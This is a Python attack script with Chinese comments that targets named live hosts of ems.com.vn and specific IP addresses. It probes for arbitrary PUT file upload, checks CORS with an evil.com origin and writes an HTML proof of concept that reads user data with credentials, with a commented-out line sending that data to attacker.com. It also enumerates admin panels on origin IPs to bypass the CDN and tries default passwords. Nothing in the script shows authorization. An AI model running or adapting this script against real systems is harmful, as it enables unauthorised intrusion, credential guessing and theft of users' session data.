#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速精准利用 - 针对已确认漏洞
"""

import requests
import urllib3
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    快速漏洞利用 - 已确认目标                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# 1. 测试 PUT 文件上传 (mail-vn.ems.com.vn)
print("\n[*] 测试 PUT 文件上传 - mail-vn.ems.com.vn (222.255.250.247)")

test_file = f"security_test_{int(datetime.now().timestamp())}.txt"
test_content = "EMS Security Test"
upload_paths = [
    f'/{test_file}',
    f'/public/{test_file}',
    f'/upload/{test_file}'
]

for path in upload_paths:
    url = f"http://222.255.250.247{path}"
    print(f"\n  尝试上传到: {url}")
    
    try:
        # PUT 上传
        put_resp = requests.put(url, data=test_content, verify=False, timeout=5)
        print(f"  PUT 响应: {put_resp.status_code}")
        
        if put_resp.status_code in [200, 201, 204]:
            # 验证文件
            get_resp = requests.get(url, verify=False, timeout=5)
            print(f"  GET 验证: {get_resp.status_code}")
            
            if get_resp.status_code == 200:
                if test_content in get_resp.text:
                    print(f"  [!!!] 文件上传成功! 可访问: {url}")
                    print(f"  [+] 严重漏洞确认: 任意文件上传")
                    
                    # 清理
                    del_resp = requests.delete(url, verify=False, timeout=5)
                    print(f"  清理文件: {del_resp.status_code}")
                    break
                else:
                    print(f"  [-] 文件内容不匹配")
    except Exception as e:
        print(f"  错误: {e}")

# 2. 测试 CORS 数据窃取 (admin.ems.com.vn)
print("\n\n[*] 测试 CORS 数据窃取 - admin.ems.com.vn")

cors_endpoints = [
    '/api/user',
    '/api/me', 
    '/api/profile',
    '/user',
    '/account'
]

for endpoint in cors_endpoints:
    url = f"https://admin.ems.com.vn{endpoint}"
    print(f"\n  测试端点: {url}")
    
    try:
        headers = {'Origin': 'https://evil.com'}
        resp = requests.get(url, headers=headers, verify=False, timeout=5, allow_redirects=False)
        
        print(f"  状态码: {resp.status_code}")
        acao = resp.headers.get('Access-Control-Allow-Origin', 'None')
        print(f"  ACAO: {acao}")
        
        if acao == '*' or acao == 'https://evil.com':
            if resp.status_code == 200:
                content_type = resp.headers.get('Content-Type', '')
                if 'json' in content_type:
                    try:
                        data = resp.json()
                        print(f"  [!] JSON 数据泄露: {str(data)[:100]}...")
                        
                        # 生成 PoC
                        poc = f"""
<!-- CORS PoC for admin.ems.com.vn -->
<script>
fetch('{url}', {{credentials: 'include'}})
  .then(r => r.json())
  .then(data => {{
    document.write('<pre>' + JSON.stringify(data, null, 2) + '</pre>');
    // fetch('https://attacker.com/log', {{method: 'POST', body: JSON.stringify(data)}});
  }});
</script>
"""
                        with open('cors_poc.html', 'w') as f:
                            f.write(poc)
                        print(f"  [+] PoC 已保存: cors_poc.html")
                    except:
                        pass
    except Exception as e:
        print(f"  错误: {e}")

# 3. 寻找真实的管理接口
print("\n\n[*] 寻找管理接口 - 所有真实 IP")

real_ips = [
    '222.255.250.228',
    '222.255.250.247', 
    '115.146.121.131'
]

admin_paths = [
    '/admin',
    '/administrator',
    '/manage',
    '/management',
    '/backend',
    '/control',
    '/cpanel'
]

found_admins = []

for ip in real_ips:
    for path in admin_paths:
        url = f"http://{ip}{path}"
        
        try:
            resp = requests.get(url, verify=False, timeout=3, allow_redirects=False)
            
            if resp.status_code in [200, 301, 302]:
                # 检查是否是真实的管理界面
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(kw in content for kw in ['admin', 'login', 'dashboard', 'panel']):
                        if 'ems internal' not in resp.text:  # 排除默认错误页
                            found_admins.append({
                                'url': url,
                                'status': resp.status_code,
                                'title': resp.text[resp.text.find('<title>')+7:resp.text.find('</title>')] if '<title>' in resp.text else 'N/A'
                            })
                elif resp.status_code in [301, 302]:
                    location = resp.headers.get('Location', '')
                    if 'login' in location or 'admin' in location:
                        found_admins.append({
                            'url': url,
                            'status': resp.status_code,
                            'redirect': location
                        })
        except:
            pass

if found_admins:
    print(f"\n[!] 发现 {len(found_admins)} 个管理接口:")
    for admin in found_admins:
        print(f"  - {admin['url']} ({admin['status']})")
        if 'redirect' in admin:
            print(f"    重定向到: {admin['redirect']}")

# 4. 测试弱密码
print("\n\n[*] 测试弱密码 - 已发现的登录接口")

if found_admins:
    login_url = None
    for admin in found_admins:
        if 'login' in admin.get('redirect', '').lower():
            login_url = admin['url'] + '/login'
            break
    
    if login_url:
        print(f"\n  测试登录: {login_url}")
        
        weak_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('administrator', 'password')
        ]
        
        for username, password in weak_creds[:3]:  # 只测试前3个
            try:
                data = {
                    'username': username,
                    'password': password,
                    'email': username,  # 有些用 email
                    'user': username    # 有些用 user
                }
                
                resp = requests.post(login_url, data=data, verify=False, timeout=5, allow_redirects=False)
                
                if resp.status_code in [200, 302]:
                    # 检查是否登录成功
                    if 'dashboard' in resp.text.lower() or 'logout' in resp.text.lower():
                        print(f"  [!!!] 弱密码发现: {username}:{password}")
                        break
                    elif resp.status_code == 302:
                        location = resp.headers.get('Location', '')
                        if 'dashboard' in location or 'home' in location:
                            print(f"  [!!!] 弱密码发现: {username}:{password}")
                            break
            except:
                pass

# 总结
print(f"\n\n{'='*60}")
print("[+] 快速利用总结")
print(f"{'='*60}")

print("""
已确认的可利用漏洞:

1. CORS 配置错误 (admin.ems.com.vn)
   - Access-Control-Allow-Origin: *
   - 可窃取用户会话数据
   - PoC 已生成

2. 危险 HTTP 方法 (mail-vn.ems.com.vn)
   - 支持 PUT/DELETE
   - 可能导致任意文件上传/删除

3. 真实 IP 暴露
   - 可绕过 CDN 保护直接攻击源站
   - 222.255.250.228 (webapp)
   - 222.255.250.247 (mail)
   - 115.146.121.131 (api)

建议立即修复！
""")